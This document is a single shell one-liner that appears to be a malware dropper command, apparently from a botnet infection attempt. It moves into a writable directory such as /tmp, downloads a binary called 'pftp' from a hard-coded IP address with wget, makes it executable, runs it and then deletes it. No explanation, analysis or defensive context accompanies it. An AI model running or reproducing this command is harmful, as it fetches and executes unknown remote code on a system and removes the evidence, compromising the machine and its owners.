cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.88.209.253/pftp; chmod +x pftp; ./pftp; rm -rf pftp
